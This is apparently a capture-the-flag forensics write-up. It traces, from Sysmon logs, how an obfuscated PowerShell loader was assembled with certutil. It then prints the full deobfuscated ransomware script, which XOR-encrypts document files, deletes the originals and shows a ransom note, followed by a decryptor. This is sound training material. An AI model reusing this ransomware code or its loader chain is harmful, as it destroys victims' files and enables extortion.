![img](assets/banner.png)

<img src='assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Cave Expedition</font>

24<sup>th</sup> December 2024

Prepared By: Nauten

Challenge Author(s): Nauten

Difficulty: <font color='orange'>Medium</font>

<br><br>

# Synopsis

- Cave Expedition is a medium forensics challenge that involves analyzing obfuscated PowerShell code, understanding its logic, and developing a decryption process to obtain the final flag

## Description

- Rumors of a black drake terrorizing the fields of Dunlorn have spread far and wide. The village has offered a hefty bounty for its defeat. Sir Alaric and Thorin answered the call also returning with treasures from its lair. Among the retrieved items they found a map. Unfortunately it cannot be used directly because a custom encryption algorithm was probably used. Luckily it was possible to retrieve the original code that managed the encryption process.
  Can you investigate about what happened and retrieve the map content?

## Skills Required

- Familiarity with evtx file structure
- Proficiency in PowerShell scripting and troubleshooting
- Expertise in reverse-engineering obfuscated code, particularly custom encryption algorithms, to devise a functional decryption approach
- Analytical skills to dissect and understand the workflow and logic of a unknown application

## Skills Learned

- Analyzing evtx files extracting relevant data
- Analysis and reverse-engineering of custom encryption algorithms
- Decoding and deconstructing obfuscated PowerShell scripts
- Developing a structured approach to understand the logic and operational flow of unknown application

# Enumeration

Players are provided with the following files:

- `Logs.zip`: containing a set of Windows event logs
- `map.pdf.secured`: containing an encoded string

There are a lot of files but only one seems to have a different size.

To parse this type of file `python-evtx` can be used. It's also possible to convert all files in the XML counterpart using a single command:

```bash
$ for f in *.evtx; do evtx_dump.py "$f" > "${f%.evtx}.xml"; done
```

Focusing on file **Microsoft-Windows-Sysmon_Operational.xml** it's possible to extract all events identifiers using:

```bash
$ grep -i -r "eventid" 'Microsoft-Windows-Sysmon_Operational.xml'  | grep -oP '<EventID[^>]*>\K[0-9]+(?=</EventID>)' | sort -nu
1
11
```

Those identifiers are related to Sysmon and the related meaning can be retrieved from [here](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-filtering-entries).

In this case:

```bash
1 	ProcessCreate 	Process Create
11 	FileCreate 	    File created
```

After careful analysis it's possible to filter the log using this command:

```bash
$ grep -i -r "\"CommandLine\"" Microsoft-Windows-Sysmon_Operational.xml | grep -v "wevtutil"
```

With this one it's possible to extract all executed commands in a clear way excluding **wevtutil** (that is the most frequent one used in this log).

The output is:

```xml
<Data Name="CommandLine">C:\Windows\system32\cmd.exe /c ""C:\Users\developer56546756\Desktop\avAFGrw41.bat""</Data>
<Data Name="CommandLine">powershell  -c "'JGszNFZtID0gIktpNTBlSFFnS2k1a2IyTWdLaTVrYjJONElDb3VjR1JtIg0KJG03OFZvID0gIkxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFFwWlQxVlNJRVpKVEVWVElFaEJWa1VnUWtWRlRpQkZUa05TV1ZCVVJVUWdRbGtnUVNCU1FVNVRUMDFYUVZKRkNpb2dWMmhoZENCb1lYQndaVzVsWkQ4S1RXOXpkQ0J2WmlCNWIzVnlJR1pwYkdWeklHRnlaU0J1YnlCc2IyNW5aWElnWVdOalpYTnphV0pzWlNCaVpXTmhkWE5sSUhSb1pYa2dhR0YyWlNCaVpXVnVJR1Z1WTNKNWNIUmxaQzRnUkc4Z2JtOTBJ' | Out-File -Encoding ascii -FilePath b -NoNewline"</Data>
<Data Name="CommandLine">powershell  -c "'SGRoYzNSbElIbHZkWElnZEdsdFpTQjBjbmxwYm1jZ2RHOGdabWx1WkNCaElIZGhlU0IwYnlCa1pXTnllWEIwSUhSb1pXMDdJR2wwSUdseklHbHRjRzl6YzJsaWJHVWdkMmwwYUc5MWRDQnZkWElnYUdWc2NDNEtLaUJJYjNjZ2RHOGdjbVZqYjNabGNpQnRlU0JtYVd4bGN6OEtVbVZqYjNabGNtbHVaeUI1YjNWeUlHWnBiR1Z6SUdseklERXdNQ1VnWjNWaGNtRnVkR1ZsWkNCcFppQjViM1VnWm05c2JHOTNJRzkxY2lCcGJuTjBjblZqZEdsdmJuTXVDaW9nU1hNZ2RHaGxjbVVnWVNCa1pXRmtiR2x1WlQ4S1QyWWdZMjkxY25ObExDQjBhR1Z5WlNCcGN5NGdXVzkxSUdoaGRtVWdkR1Z1SUdSaGVYTWdiR1ZtZEM0Z1JHOGdibTkwSUcxcGMzTWdkR2hwY3lCa1pXRmtiR2x1WlM0S0xTMHRM' | Out-File -Encoding ascii -FilePath b -Append -NoNewline"</Data>
... snip ...
<Data Name="CommandLine">certutil  -decode b avAFGrw41.ps1</Data>
<Data Name="CommandLine">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy Bypass -File avAFGrw41.ps1</Data>
```

It's possible to reconstruct the workflow:

- run **avAFGrw41.bat**
- some PowerShell commands are executed to assemble multiple payload chunks into file **b**
- **certutil** command is executed applying a base64 operation to **b** content saving the original payload in file **avAFGrw41.ps1**
- file **avAFGrw41.ps1** is then executed

Taking all base64 strings, putting them into a local file and applying a base64 decode operation allows to see the entire payload executed.

Analyzing the file it's possible to immediately notice that some obfuscation technique is applied and, because of that, it's important to focus mainly on understanding the workflow and breaking down each part.

On run two functions are called:

- `o12Vq`(with a parameter)
- `n90Vp`

Decoding first declared variables and see where they are used is also useful to understand what the other functions do. 

Variable `k34Vm` after applying a base64 decode returns:

```
*.txt *.doc *.docx *.pdf
```

and it's called in function `l56Vn` that is also used in main function `o12Vq`

Variable `m78Vo` after applying a base64 decode operation returns this text:

```
YOUR FILES HAVE BEEN ENCRYPTED BY A RANSOMWARE
* What happened?
Most of your files are no longer accessible because they have been encrypted. Do not waste your time trying to find a way to decrypt them; it is impossible without our help.
* How to recover my files?
Recovering your files is 100% guaranteed if you follow our instructions.
* Is there a deadline?
Of course, there is. You have ten days left. Do not miss this deadline.
```

Mixing those informations it's possible to deduct that this is a ransomware that encodes only files having some specific extensions.

Instead, `a53Va` and `b64Vb` after applying base64 decode operation don't return a plaintext printable value.

## Main workflow and behavior

The main function `o12Vq` appears to handle the encryption process. Here is a breakdown of its workflow:

- **Targeting Specific File Types:**
  - The function `l56Vn` processes the `k34Vm` variable, which specifies the targeted file extensions: `*.txt`, `*.doc`, `*.docx`, and `*.pdf`
- **Recursive File Search:**
  - `Get-ChildItem` is used to recursively locate files with the specified extensions
- **File Encryption:**
  - For each matching file:
    - The file’s contents are read as bytes
    - The function `s78Vu` performs the encryption using the decoded values of `a53Va` and `b64Vb`
    - The encrypted content is saved to a new file with a `.secured` extension
    - The original file is deleted
- **Error Handling:**
  - Errors are silently caught and ignored, ensuring the script completes execution without interruption.

The second function `n90Vp` decodes and displays the `m78Vo` banner, providing information about the ransomware attack and instructions for the victim.

## Understanding the encryption logic

The encryption logic is implemented in the function `s78Vu`. Here's how it works:

1. **Key Preparation:**
   - The function converts the parameters `u12Vw` and `v34Vx` (that correspond to decoded version of keys we found at the beginning in `a53Va` and `b64Vb` variables) into byte arrays
2. **XOR Operation:**
   - The input file's bytes are XORed with the key bytes in a cyclic manner using the helper function `l34Vn` (this is the core encryption function)
3. **Output Encoding:**
   - The resulting byte array is encoded into a base64 string before being written to the `.secured` file

## Character substitution logic

The script includes character substitution tables, `e90Vg` and `f12Vh`, constructed as follows:

- `e90Vg` maps each alphanumeric character to the next character (cyclically)
- `f12Vh` reverses this mapping

Focus on `l34Vn` function parameters:

- `m56Vo`**:** The byte array of the file's contents to be encrypted or decrypted
- `n78Vp`**:** The first key, converted into a byte array from its string form
- `o90Vq`**:** The second key, also converted into a byte array

and related workflow:

1. **Initialization:**
   - A new byte array `p12Vr` is initialized with the same length as `m56Vo`. This will hold the resulting encrypted or decrypted data
2. **Cyclic XOR Operation:**
   - For each byte in the input array `m56Vo`, the following steps are performed:
     - The current byte is XORed with a byte from `n78Vp`. The byte from `n78Vp` is selected based on the current index modulo the length of `n78Vp`
     - The result is then XORed with a byte from `o90Vq`, similarly selected based on the current index modulo the length of `o90Vq`
     - The final result is stored in the corresponding position in the output array `p12Vr`
3. **Return Result:**
   - The modified byte array `p12Vr` is returned, representing the encrypted or decrypted data

This cyclic XOR mechanism ensures that the encryption is not simple and requires knowledge of both keys (`n78Vp` and `o90Vq`) to reverse the process.

 After reordering the code and putting some comments:

```powershell
# Banner print
$m78Vo = "LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQgQlkgQSBSQU5TT01XQVJFCiogV2hhdCBoYXBwZW5lZD8KTW9zdCBvZiB5b3VyIGZpbGVzIGFyZSBubyBsb25nZXIgYWNjZXNzaWJsZSBiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gRG8gbm90IHdhc3RlIHlvdXIgdGltZSB0cnlpbmcgdG8gZmluZCBhIHdheSB0byBkZWNyeXB0IHRoZW07IGl0IGlzIGltcG9zc2libGUgd2l0aG91dCBvdXIgaGVscC4KKiBIb3cgdG8gcmVjb3ZlciBteSBmaWxlcz8KUmVjb3ZlcmluZyB5b3VyIGZpbGVzIGlzIDEwMCUgZ3VhcmFudGVlZCBpZiB5b3UgZm9sbG93IG91ciBpbnN0cnVjdGlvbnMuCiogSXMgdGhlcmUgYSBkZWFkbGluZT8KT2YgY291cnNlLCB0aGVyZSBpcy4gWW91IGhhdmUgdGVuIGRheXMgbGVmdC4gRG8gbm90IG1pc3MgdGhpcyBkZWFkbGluZS4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQo="
# Base64 decode
function n90Vp {
     [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m78Vo))
}

# Return extensions
$k34Vm = "Ki50eHQgKi5kb2MgKi5kb2N4ICoucGRm"
function l56Vn {
    return (a12Vc $k34Vm).Split(" ")
}

# Base64 decode
function a12Vc {
    param([string]$a34Vd)
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a34Vd))
}
# Declare and decode keys
$a53Va = "NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg=="
$b64Vb = "n2mmXaWy5pL4kpNWr7bcgEKxMeUx50MJ"
$c56Ve = a12Vc $a53Va
$d78Vf = a12Vc $b64Vb

# Create transformation maps
$e90Vg = @{}
$f12Vh = @{}
For ($x = 65; $x -le 90; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 90) { [char]65 } else { [char]($x + 1) }
}
For ($x = 97; $x -le 122; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 122) { [char]97 } else { [char]($x + 1) }
}
For ($x = 48; $x -le 57; $x++) {
    $e90Vg[([char]$x)] = if($x -eq 57) { [char]48 } else { [char]($x + 1) }
}
$e90Vg.GetEnumerator() | ForEach-Object {
    $f12Vh[$_.Value] = $_.Key
}

# Binary operation
function l34Vn {
    param([byte[]]$m56Vo, [byte[]]$n78Vp, [byte[]]$o90Vq)
    $p12Vr = [byte[]]::new($m56Vo.Length)
    for ($x = 0; $x -lt $m56Vo.Length; $x++) {
        $q34Vs = $n78Vp[$x % $n78Vp.Length]
        $r56Vt = $o90Vq[$x % $o90Vq.Length]
        $p12Vr[$x] = $m56Vo[$x] -bxor $q34Vs -bxor $r56Vt
    }
    return $p12Vr
}

# Transform binary function
function s78Vu {
    param([byte[]]$t90Vv, [string]$u12Vw, [string]$v34Vx)

    if ($t90Vv -eq $null -or $t90Vv.Length -eq 0) {
        return $null
    }

    $y90Va = [System.Text.Encoding]::UTF8.GetBytes($u12Vw)
    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb

    return [Convert]::ToBase64String($a34Vc)
}

# Process files function
function o12Vq {
    param([switch]$p34Vr)

    try {
        if ($p34Vr) {
            foreach ($q56Vs in l56Vn) {
                $d34Vp = "dca01aq2/"
                if (Test-Path $d34Vp) {
                    Get-ChildItem -Path $d34Vp -Recurse -ErrorAction Stop |
                        Where-Object { $_.Extension -match "^\.$q56Vs$" } |
                        ForEach-Object {
                            $r78Vt = $_.FullName
                            if (Test-Path $r78Vt) {
                                $s90Vu = [IO.File]::ReadAllBytes($r78Vt)
                                $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
                                [IO.File]::WriteAllText("$r78Vt.secured", $t12Vv)
                                Remove-Item $r78Vt -Force
                            }
                        }
                }
            }
        }
    }
    catch {}
}

if ($env:USERNAME -eq "developer56546756" -and $env:COMPUTERNAME -eq "Workstation5678") {
    o12Vq -p34Vr
    n90Vp
}
```

It's also important to notice that this script encrypts content of folder named `dca01aq2` and only if current user is `developer56546756` on a computer with hostname `Workstation5678`.

# Solution

With all these elements It's possible to develop decrypt function and related transformation function, add it in the code and call it in this way:

```powershell
function Reverse-Decrypt {
    param([string]$encryptedContent, [string]$encodedKey1, [string]$encodedKey2)

    try {
        $fromBase64Content = [Convert]::FromBase64String($encryptedContent.Trim())
        $fromBase64key1 = [System.Text.Encoding]::UTF8.GetBytes($encodedKey1)
        $fromBase64key2 = [System.Text.Encoding]::UTF8.GetBytes($encodedKey2)
        # Call original l34Vn function
        $decryptedContent = l34Vn $fromBase64Content $fromBase64key1 $fromBase64key2
        return $decryptedContent
    }
    catch {
        Write-Error "Error: $_"
        return $null
    }
}

function Decrypt-File {
    Get-ChildItem -Filter "*.secured" -Recurse -ErrorAction Stop |
    ForEach-Object {
        $encryptedName = $_.FullName
        Write-Output "Processing file: $encryptedName"

        if (Test-Path $encryptedName) {
            $encryptedContent = [IO.File]::ReadAllText($encryptedName)
            $decryptedContent = Reverse-Decrypt $encryptedContent $c56Ve $d78Vf
            
            $decryptedName = $encryptedName -replace "\.secured$", ""
            [IO.File]::WriteAllBytes($decryptedName, $decryptedContent)
            Write-Output "Restored original file: $decryptedName"
        }
    }
}

Decrypt-File
```

After decrypting file `map.pdf.encrypted` the flag can be retrieved.
